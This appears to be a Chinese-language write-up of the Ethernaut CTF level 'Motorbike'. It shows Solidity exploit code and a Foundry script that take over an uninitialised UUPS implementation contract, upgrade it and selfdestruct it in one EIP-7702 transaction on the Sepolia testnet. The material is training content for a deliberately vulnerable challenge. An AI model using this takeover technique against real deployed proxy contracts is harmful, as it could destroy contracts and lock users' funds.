# Ethernaut Level 26: Motorbike - 使用EIP-7702版

## 问题本质

**一句话：** Cancun 升级后，`selfdestruct` 只在创建合约的同一交易内才能真正销毁合约，而传统方案需要两个交易。

## 核心矛盾

```
传统方案（失败）:
TX1: createLevelInstance() → 部署 Engine
TX2: selfdestruct Engine   → ❌ 不同交易，销毁失败

EIP-7702方案（成功）:
TX1: 所有操作在一个交易内 → ✅ 创建+销毁同时完成
```

## 三个关键点

### 1. EIP-6780（问题根源）
```solidity
// Cancun 后的规则：
同一交易创建+销毁 → 真删除 ✅
不同交易销毁      → 只转账 ❌
```

### 2. EIP-7702（解决方案）
```
EOA 签名授权 → 临时变成合约 → 单交易执行复杂逻辑
```

### 3. UUPS 漏洞（攻击入口）
```solidity
// Proxy delegatecall 初始化 → 只改 Proxy 的 storage
// Engine 自己的 storage → 从未初始化 → 任何人可控
Engine.initialize()  // 成为 upgrader
Engine.upgradeToAndCall(destroyer, "destroy()")  // 自毁
```

---

## 实现代码

### 攻击合约（50 行搞定）

```solidity
contract MotorbikeExploit {
    function solve(uint256 levelNonce) external payable returns (address) {
        // 1. 预测 Engine 地址（RLP 编码）
        address engine = computeAddress(FACTORY, levelNonce);
        
        // 2. 创建实例
        ETHERNAUT.call{value: msg.value}(
            abi.encodeWithSignature("createLevelInstance(address)", FACTORY)
        );
        
        // 3. 占领 Engine
        IEngine(engine).initialize();
        
        // 4. 部署自毁合约
        Destroyer d = new Destroyer();
        
        // 5. 升级+自毁（同一交易）
        IEngine(engine).upgradeToAndCall(
            address(d), 
            abi.encodeWithSignature("destroy()")
        );
        
        return computeAddress(FACTORY, levelNonce + 1);  // Proxy 地址
    }
}

contract Destroyer {
    function destroy() external { selfdestruct(payable(msg.sender)); }
}
```

**关键：** RLP 地址预测算法
```solidity
function computeAddress(address deployer, uint256 nonce) internal pure returns (address) {
    if (nonce <= 0x7f) {
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))
        ))));
    }
    if (nonce <= 0xff) {
        return address(uint160(uint256(keccak256(
            abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))
        ))));
    }
    // ... 更大 nonce 类似处理
}
```

### Foundry 脚本（核心 10 行）

```solidity
function run() external {
    uint256 mainPk = vm.envUint("MY_MAIN_PK");
    uint256 secPk = vm.envUint("MY_SEC_PK");
    
    // 部署实现合约
    vm.broadcast(mainPk);
    MotorbikeExploit impl = new MotorbikeExploit();
    
    // 主账户签名授权
    VmSafe.SignedDelegation memory sig = vm.signDelegation(address(impl), mainPk);
    
    // 次账户执行攻击（主账户临时变成合约）
    vm.broadcast(secPk);
    vm.attachDelegation(sig);
    MotorbikeExploit(vm.addr(mainPk)).solve(vm.getNonce(FACTORY));
    
    // 提交完成
    vm.broadcast(mainPk);
    ETHERNAUT.call(abi.encodeWithSignature("submitLevelInstance(address)", proxy));
}
```

---

## 执行

```bash
forge script script/MotorbikeExpFinal.s.sol \
    --rpc-url $sepolia_rpc --broadcast
```

**一次成功输出：**
```
Engine code size: 0  ✅
Level completed     ✅
```

---

## 技术要点

### 1. 为什么需要两个账户？
```
Main:  签名授权 → 临时变合约 → 执行逻辑
Sec:   发送交易 → 支付 gas → 触发执行
```

### 2. 为什么要预测地址？
```
EIP-7702 的 call 返回空数据 → 必须手动计算地址
CREATE: address = keccak256(rlp([deployer, nonce]))[12:]
```

### 3. 核心突破点
```
单交易完成：
  createInstance (部署 Engine)
  + initialize (控制 Engine)  
  + deploy Destroyer
  + upgradeToAndCall (销毁 Engine)
→ 满足 EIP-6780 要求 ✅
```

---

## 一句话总结

**EIP-7702 让 EOA 临时变合约，在单个交易内完成"创建→控制→销毁"，绕过 Cancun 的 selfdestruct 限制。**

---

**完成时间：** 2025-10-27  
**技术栈：** `EIP-7702` `EIP-6780` `UUPS` `RLP`  
**难度：** ⭐⭐⭐⭐⭐

**完成时间：** 2025-10-27  
**技术栈：** `EIP-7702` `EIP-6780` `UUPS` `RLP`  
**难度：** ⭐⭐⭐⭐⭐

### ref
- https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/?tab=readme-ov-file